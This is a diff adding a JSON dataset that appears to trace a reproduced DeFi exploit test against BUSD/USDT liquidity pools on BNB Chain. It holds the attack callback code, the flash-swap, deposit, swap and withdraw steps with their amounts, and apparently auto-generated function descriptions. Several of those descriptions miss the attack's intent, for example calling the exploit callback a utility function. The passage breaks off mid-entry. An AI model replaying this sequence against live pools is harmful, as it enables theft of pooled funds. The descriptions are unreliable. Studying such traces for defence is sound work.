@@ -1,0 +1,744 @@
+[
+    {
+        "id": "949386",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        Pair.swap(0, 7_500_000 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"Attacker BUSD balance after exploit\", BUSD.balanceOf(address(this)), BUSD.decimals()\n        );\n    }\n\n",
+        "description": "1. Core functions:  \nThe `testExploit` function is designed to simulate an exploit scenario. It calls the `swap` function of a `Pair` contract, which likely represents a decentralized exchange (DEX) pair. The function swaps a specific amount of tokens (0 for one token and 7,500,000 * 1e18 for another) and sends the swapped tokens to the address of the contract executing this function. After the swap, it emits an event to log the attacker's balance of a specific token (BUSD) in a human-readable format.\n\n2. Security mechanism:  \nThe function itself does not include explicit security mechanisms like access control or input validation. However, the use of `new bytes(1)` as the last parameter in the `swap` function suggests it might be a placeholder or a minimal data payload, which could be part of a broader security strategy in the `Pair` contract. Additionally, the function emits an event to log the attacker's balance, which can be useful for monitoring and auditing purposes.\n\n3. Parameter Function:  \n- `0`: Represents the amount of the first token to swap (likely set to 0 to indicate no swap for this token).  \n- `7_500_000 * 1e18`: Represents the amount of the second token to swap, scaled to 18 decimal places (a common practice in Ethereum-based tokens).  \n- `address(this)`: Specifies the recipient address for the swapped tokens, which is the contract executing this function.  \n- `new bytes(1)`: A minimal data payload, possibly used as a placeholder or to trigger specific logic in the `Pair` contract.  \n\n4. Return description:  \nThe function does not return any value directly. Instead, it emits an event (`log_named_decimal_uint`) that logs the attacker's balance of BUSD tokens after the exploit. The balance is retrieved using `BUSD.balanceOf(address(this))`, which queries the BUSD token contract for the balance of the executing contract. The balance is then formatted using the token's decimal places for readability.\n\nIn summary,  \nThe `testExploit` function simulates an exploit by swapping tokens in a DEX pair and logs the attacker's BUSD balance afterward. It lacks explicit security measures but uses minimal data payloads and emits events for monitoring. The parameters define the swap amounts, recipient address, and a data payload, while the output is a logged balance of BUSD tokens.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "935666",
+        "args": "0, 7500000000000000000000000 [7.5e24], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00",
+        "original_code": "    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n        require(amount0Out > 0 || amount1Out > 0, 'Pancake: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Pancake: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        { // scope for _token{0,1}, avoids stack too deep errors\n        address _token0 = token0;\n        address _token1 = token1;\n        require(to != _token0 && to != _token1, 'Pancake: INVALID_TO');\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        if (data.length > 0) IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'Pancake: INSUFFICIENT_INPUT_AMOUNT');\n        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n        uint balance0Adjusted = (balance0.mul(10000).sub(amount0In.mul(25)));\n        uint balance1Adjusted = (balance1.mul(10000).sub(amount1In.mul(25)));\n        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(10000**2), 'Pancake: K');\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n\n    // force balances to match reserves\n",
+        "description": "1. **Core functions**:  \n   The `swap` function is designed to facilitate the exchange of two tokens within a decentralized exchange (DEX) system. It allows users to swap one token for another by specifying the amounts they want to receive (`amount0Out` and `amount1Out`) and the address (`to`) where the tokens should be sent. The function ensures that the swap is executed correctly by checking the available reserves of the tokens, transferring the tokens to the recipient, and updating the reserves after the swap. Additionally, it supports a callback mechanism (`pancakeCall`) for more complex interactions if needed.\n\n2. **Security mechanism**:  \n   - The `lock` modifier ensures that the function cannot be re-entered, preventing reentrancy attacks.  \n   - The `require` statements enforce conditions such as ensuring the output amounts are valid, the reserves are sufficient, and the recipient address is not one of the token addresses.  \n   - The `_safeTransfer` function safely transfers tokens to the recipient, reducing the risk of errors or vulnerabilities.  \n   - The function checks the adjusted balances to ensure the swap maintains the integrity of the liquidity pool (e.g., the product of the reserves remains consistent).  \n\n3. **Parameter Function**:  \n   - `amount0Out`: The amount of the first token to be sent to the recipient.  \n   - `amount1Out`: The amount of the second token to be sent to the recipient.  \n   - `to`: The address of the recipient who will receive the tokens.  \n   - `data`: Optional data that can be used for a callback function (`pancakeCall`) to enable more complex interactions.  \n\n4. **Return description**:  \n   The function does not return a value directly. Instead, it performs the following calculations and checks:  \n   - It calculates the input amounts (`amount0In` and `amount1In`) based on the difference between the current balances and the reserves after the swap.  \n   - It adjusts the balances by subtracting a small fee (0.25%) and ensures the product of the adjusted balances is greater than or equal to the product of the reserves multiplied by a constant (to maintain the pool's integrity).  \n   - Finally, it updates the reserves and emits a `Swap` event to log the transaction details.  \n\nIn summary, the `swap` function enables secure token swaps in a decentralized exchange by ensuring proper checks, balances, and updates to the liquidity pool. It uses modifiers and safeguards to prevent vulnerabilities and supports optional callbacks for advanced use cases.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "29971",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7500000000000000000000000 [7.5e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "864256",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 7500000000000000000000000 [7.5e24], 0x00",
+        "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        BUSD.approve(address(Swap), type(uint256).max);\n        USDT.approve(address(Swap), type(uint256).max);\n        BUSD.approve(address(BUSDPool), type(uint256).max);\n        USDT.approve(address(USDTPool), type(uint256).max);\n        Swap.swap(address(BUSD), address(USDT), 2_003_300 * 1e18, 1, address(this), block.timestamp);\n        BUSDPool.deposit(5_000_000 * 1e18); // deposit BUSD to BUSDPool\n        Swap.swap(address(BUSD), address(USDT), 496_700 * 1e18, 1, address(this), block.timestamp);\n        USDTPool.deposit(2_000_000 * 1e18); // deposit USDT to USDTPool\n\n        console.log(\n            \"BUSDPool tokenBalance, BUSDPool vUsdBalance, BUSD/vUSD rate:\",\n            BUSDPool.tokenBalance(),\n            BUSDPool.vUsdBalance(),\n            BUSDPool.tokenBalance() / BUSDPool.vUsdBalance()\n        );\n        bytes32 token = bytes32(uint256(uint160(address(USDT))));\n",
+        "description": "1. **Core functions:**\n   The `pancakeCall` function is designed to handle a series of operations related to swapping and depositing tokens. It first approves the maximum possible allowance for two tokens (BUSD and USDT) to be used by the `Swap` and pool contracts. Then, it performs two swap operations: one for a large amount of BUSD to USDT and another for a smaller amount. After the swaps, it deposits BUSD into the `BUSDPool` and USDT into the `USDTPool`. Finally, it logs some information about the balances and rates in the `BUSDPool`.\n\n2. **Security mechanism:**\n   The function uses the `external` modifier, which means it can only be called from outside the contract, not from within it. This helps to prevent internal misuse. Additionally, the function does not include any explicit access control, which could be a security concern. The use of `block.timestamp` for the swap deadline is a common practice but should be used cautiously to avoid potential timestamp manipulation.\n\n3. **Parameter Function:**\n   - `sender`: This parameter represents the address that initiated the call. It is not used within the function, so its role is unclear here.\n   - `amount0` and `amount1`: These parameters likely represent the amounts of tokens involved in the swap, but they are not used in the function. Their purpose is not clear in this context.\n   - `data`: This parameter is a byte array that could contain additional information or instructions for the function. However, it is not used in the function, so its role is not utilized here.\n\n4. **Return description:**\n   The function does not return any value. Instead, it performs a series of operations (approvals, swaps, and deposits) and logs some information about the `BUSDPool` balances and rates. The logging is done using `console.log`, which is typically used for debugging purposes and does not affect the function's output.\n\nIn summary, the `pancakeCall` function is a utility function that handles token swaps and deposits into pools, but it lacks clear use of its parameters and does not return any value. The security mechanisms are minimal, and the function could benefit from additional access control and parameter utilization.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "24562",
+        "args": "Swap: [0x312Bc7eAAF93f1C60Dc5AfC115FcCDE161055fb0], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "24562",
+        "args": "Swap: [0x312Bc7eAAF93f1C60Dc5AfC115FcCDE161055fb0], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "24562",
+        "args": "BUSDPool: [0x179aaD597399B9ae078acFE2B746C09117799ca0], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "24562",
+        "args": "USDTPool: [0xB19Cd6AB3890f18B662904fd7a40C003703d2554], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "95367",
+        "args": "BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], USDT: [0x55d398326f99059fF775485246999027B3197955], 2003300000000000000000000 [2.003e24], 1, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1680386219 [1.68e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000001a79446903051a71b58fc00000000000000000000000000000000000000000000000ad83f0c44b9b64b00"
+    },
+    {
+        "id": "90240",
+        "args": "BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], USDT: [0x55d398326f99059fF775485246999027B3197955], 2003300000000000000000000 [2.003e24], 1, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1680386219 [1.68e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000001a79446903051a71b58fc00000000000000000000000000000000000000000000000ad83f0c44b9b64b00"
+    },
+    {
+        "id": "250",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000012"
+    },
+    {
+        "id": "250",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000012"
+    },
+    {
+        "id": "2358",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000096f4eab3a8ef034171d03"
+    },
+    {
+        "id": "391",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000007a622456c12238ae3aad0"
+    },
+    {
+        "id": "2358",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000006dccc95517042caa2333b"
+    },
+    {
+        "id": "391",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000085f4f1683d42e354bb7a4"
+    },
+    {
+        "id": "5776",
+        "args": "2003300000000000000000000 [2.003e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5828",
+        "args": "2000496274621337628156924 [2e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "358",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000005352d768233ac69d08f3f"
+    },
+    {
+        "id": "391",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000085f4f1683d42e354bb7a4"
+    },
+    {
+        "id": "10834",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xF319947eCe3823b790dd87b0A509396fE325745a, 2003300000000000000000000 [2.003e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "14997",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2000296224993875494394108 [2e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "12871",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2000296224993875494394108 [2e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "124130",
+        "args": "5000000000000000000000000 [5e24]",
+        "original_code": "    function deposit(uint256 amount) external {\n        uint256 oldD = d;\n\n        uint256 amountSP = toSystemPrecision(amount);\n        require(amountSP > 0, \"Pool: too little\");\n        tokenBalance += amountSP;\n        vUsdBalance += amountSP;\n        require(tokenBalance < MAX_TOKEN_BALANCE, \"Pool: too much\");\n\n        token.safeTransferFrom(msg.sender, address(this), amount);\n\n        _updateD();\n\n        if (totalLpAmount == 0 || oldD == 0) {\n            // Initial deposit\n            _depositLp(msg.sender, d >> 1); // Divide by 2 to have initial LP amount close to deposited token amount\n        } else {\n            // Consequent deposits, mint LP according to the D increase\n            _depositLp(msg.sender, totalLpAmount * (d - oldD) / oldD);\n        }\n    }\n\n    // Subtract X and Y for that amount, calculate current price and withdraw the token to the user according to the price\n",
+        "description": "1. Core functions:  \nThe `deposit` function allows a user to deposit a specified amount of tokens into the system. It updates the system's token and virtual USD balances, ensures the deposit is within acceptable limits, and mints liquidity provider (LP) tokens to the user based on the deposit amount. If it's the first deposit, it initializes the LP tokens. For subsequent deposits, it calculates the LP tokens based on the increase in the system's internal value (`d`).\n\n2. Security mechanism:  \n- `require(amountSP > 0, \"Pool: too little\")`: Ensures the deposit amount is greater than zero to prevent invalid transactions.  \n- `require(tokenBalance < MAX_TOKEN_BALANCE, \"Pool: too much\")`: Prevents the token balance from exceeding a maximum limit, ensuring system stability.  \n- `token.safeTransferFrom(msg.sender, address(this), amount)`: Safely transfers tokens from the user to the contract, reducing the risk of failed transfers.  \n- `_updateD()`: Updates the internal value (`d`) to reflect the new state of the system after the deposit.  \n\n3. Parameter Function:  \n- `uint256 amount`: Represents the amount of tokens the user wants to deposit. This value is converted into the system's precision format (`amountSP`) to ensure consistency in calculations.  \n\n4. Return description:  \nThe function does not return a value directly. Instead, it updates the system's token and virtual USD balances, mints LP tokens to the user, and adjusts the internal value (`d`). The LP tokens minted depend on whether it's the first deposit or a subsequent one. For the first deposit, the LP tokens are half the internal value (`d >> 1`). For subsequent deposits, the LP tokens are calculated based on the proportional increase in `d` relative to the previous value (`oldD`).  \n\nIn summary, the `deposit` function handles user deposits, updates system balances, ensures security through checks and safe transfers, and mints LP tokens based on the deposit amount and system state.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "10834",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BUSDPool: [0x179aaD597399B9ae078acFE2B746C09117799ca0], 5000000000000000000000000 [5e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "39067",
+        "args": "BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], USDT: [0x55d398326f99059fF775485246999027B3197955], 496700000000000000000000 [4.967e23], 1, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1680386219 [1.68e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000068ec75ad9e75bd98ba5d000000000000000000000000000000000000000000000002afb25047a5d23659"
+    },
+    {
+        "id": "38440",
+        "args": "BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], USDT: [0x55d398326f99059fF775485246999027B3197955], 496700000000000000000000 [4.967e23], 1, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1680386219 [1.68e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000068ec75ad9e75bd98ba5d000000000000000000000000000000000000000000000002afb25047a5d23659"
+    },
+    {
+        "id": "250",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000012"
+    },
+    {
+        "id": "250",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000012"
+    },
+    {
+        "id": "358",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000b1785c78b4ca53b271d03"
+    },
+    {
+        "id": "391",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000007a622456c12238ae3aad0"
+    },
+    {
+        "id": "358",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000005352d768233ac69d08f3f"
+    },
+    {
+        "id": "391",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000085f4f1683d42e354bb7a4"
+    },
+    {
+        "id": "976",
+        "args": "496700000000000000000000 [4.967e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1028",
+        "args": "495537579185659060089014 [4.955e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "358",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000004cc3e512244ef06659e89"
+    },
+    {
+        "id": "391",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000085f4f1683d42e354bb7a4"
+    },
+    {
+        "id": "6034",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xF319947eCe3823b790dd87b0A509396fE325745a, 496700000000000000000000 [4.967e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "5397",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 495488025427740494183005 [4.954e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3271",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 495488025427740494183005 [4.954e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "123758",
+        "args": "2000000000000000000000000 [2e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "10834",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], USDTPool: [0xB19Cd6AB3890f18B662904fd7a40C003703d2554], 2000000000000000000000000 [2e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "329",
+        "args": "",
+        "original_code": "",
+        "description": "",
+        "return_value": "5322629245 [5.322e9]"
+    },
+    {
+        "id": "353",
+        "args": "",
+        "original_code": "",
+        "description": "",
+        "return_value": "5306461333 [5.306e9]"
+    },
+    {
+        "id": "353",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "5306461333 [5.306e9]"
+    },
+    {
+        "id": "329",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "5322629245 [5.322e9]"
+    },
+    {
+        "id": "0",
+        "args": "\"BUSDPool tokenBalance, BUSDPool vUsdBalance, BUSD/vUSD rate:\", 5322629245 [5.322e9], 5306461333 [5.306e9], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "495784260421615988577113 [4.957e23]"
+    },
+    {
+        "id": "98304",
+        "args": "495784260421615988577113 [4.957e23], 0x00000000000000000000000055d398326f99059ff775485246999027b3197955, 0x000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d56, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "37776",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 495784260421615988577113 [4.957e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000001d5d8c26"
+    },
+    {
+        "id": "9813",
+        "args": "2979795262 [2.979e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000077f3d4dc"
+    },
+    {
+        "id": "6034",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], USDTPool: [0xB19Cd6AB3890f18B662904fd7a40C003703d2554], 495784260421615988577113 [4.957e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "54592",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 492669990 [4.926e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000067f0fb5733ab0d60a800"
+    },
+    {
+        "id": "9999",
+        "args": "5799131323 [5.799e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000011ff3dce4"
+    },
+    {
+        "id": "23171",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 490849077314500000000000 [4.908e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "329",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4831042788 [4.831e9]"
+    },
+    {
+        "id": "353",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "5799131323 [5.799e9]"
+    },
+    {
+        "id": "329",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4831042788 [4.831e9]"
+    },
+    {
+        "id": "353",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "5799131323 [5.799e9]"
+    },
+    {
+        "id": "0",
+        "args": "\"BUSDPool tokenBalance, BUSDPool vUsdBalance, vUSD/BUSD rate:\", 4831042788 [4.831e9], 5799131323 [5.799e9], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "60213",
+        "args": "4830262616 [4.83e9]",
+        "original_code": "    function withdraw(uint256 amountLp) external {\n        uint256 totalLpAmount_ = totalLpAmount; // Gas optimization\n\n        _withdrawLp(msg.sender, amountLp);\n\n        // Calculate actual and virtual tokens using burned LP amount share\n        // Swap the difference, get total amount to transfer/burn\n        uint256 amountSP = _preWithdrawSwap(\n            tokenBalance * amountLp / totalLpAmount_, \n            vUsdBalance * amountLp / totalLpAmount_\n        );\n\n        // Always equal amounts removed from actual and virtual tokens\n        tokenBalance -= amountSP;\n        vUsdBalance -= amountSP;\n        \n        // Update D and transfer tokens to the sender\n        _updateD();\n        token.safeTransfer(msg.sender, fromSystemPrecision(amountSP));\n    }\n\n    // Calculate differentce between actual and virtual token, divide by 2 and swap\n    // Return min of resulting actual/virtual token amount\n",
+        "description": "1. Core functions:\n   The `withdraw` function allows a user to withdraw their liquidity from a pool. It first retrieves the total amount of liquidity in the pool for gas optimization. Then, it calls an internal function to handle the withdrawal of liquidity. After that, it calculates the actual and virtual tokens based on the share of the burned liquidity. It then swaps the difference between these tokens and updates the balances. Finally, it updates the system state and transfers the tokens to the user.\n\n2. Security mechanism:\n   The function uses `external` to ensure it can only be called from outside the contract, which is a basic security measure. It also uses `safeTransfer` to handle token transfers, which is a safer method that checks for success and reverts if the transfer fails. The function also updates the system state (`_updateD`) after the withdrawal to ensure consistency.\n\n3. Parameter Function:\n   The function takes one parameter, `amountLp`, which represents the amount of liquidity the user wants to withdraw. This parameter is used to calculate the share of the total liquidity that the user is withdrawing, which in turn is used to determine the amount of actual and virtual tokens to be swapped and transferred.\n\n4. Return description:\n   The function does not return any value directly. Instead, it performs several operations: it withdraws liquidity, calculates and swaps tokens, updates balances, and transfers tokens to the user. The key calculation involves determining the amount of tokens to be transferred based on the user's share of the total liquidity.\n\nIn summary, the `withdraw` function allows users to withdraw their liquidity from a pool, calculates the appropriate amount of tokens to be transferred based on their share, and ensures the system state is updated securely.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "3271",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 554990139715101532521 [5.549e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "9999",
+        "args": "6239357472 [6.239e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000105e36669"
+    },
+    {
+        "id": "3271",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4830999058000000000000000 [4.83e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "329",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "43730 [4.373e4]"
+    },
+    {
+        "id": "353",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "968132265 [9.681e8]"
+    },
+    {
+        "id": "329",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "43730 [4.373e4]"
+    },
+    {
+        "id": "353",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "968132265 [9.681e8]"
+    },
+    {
+        "id": "0",
+        "args": "\"BUSDPool tokenBalance, BUSDPool vUsdBalance, vUSD/BUSD rate:\", 43730 [4.373e4], 968132265 [9.681e8], 22138 [2.213e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "46088",
+        "args": "40000000000000000000000 [4e22], 0x000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d56, 0x00000000000000000000000055d398326f99059ff775485246999027b3197955, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "23246",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 40000000000000000000000 [4e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000002f0d3083"
+    },
+    {
+        "id": "8883",
+        "args": "39983730 [3.998e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000aa75626"
+    },
+    {
+        "id": "6034",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BUSDPool: [0x179aaD597399B9ae078acFE2B746C09117799ca0], 40000000000000000000000 [4e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "20906",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 789393539 [7.893e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000a736dfe61cb75b0c9800"
+    },
+    {
+        "id": "9813",
+        "args": "2801861983 [2.801e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000008278e70f"
+    },
+    {
+        "id": "3271",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 789647460433500000000000 [7.896e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "329",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "39983730 [3.998e7]"
+    },
+    {
+        "id": "353",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "178738726 [1.787e8]"
+    },
+    {
+        "id": "329",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "39983730 [3.998e7]"
+    },
+    {
+        "id": "353",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "178738726 [1.787e8]"
+    },
+    {
+        "id": "0",
+        "args": "\"BUSDPool tokenBalance, BUSDPool vUsdBalance, vUSD/BUSD rate:\", 39983730 [3.998e7], 178738726 [1.787e8], 4",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "61189",
+        "args": "1993728530 [1.993e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3271",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1237656562679651553685 [1.237e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "9813",
+        "args": "3047149885 [3.047e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000073fb51c2"
+    },
+    {
+        "id": "3271",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1995192851000000000000000 [1.995e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2786077967996179651553685 [2.786e24]"
+    },
+    {
+        "id": "45867",
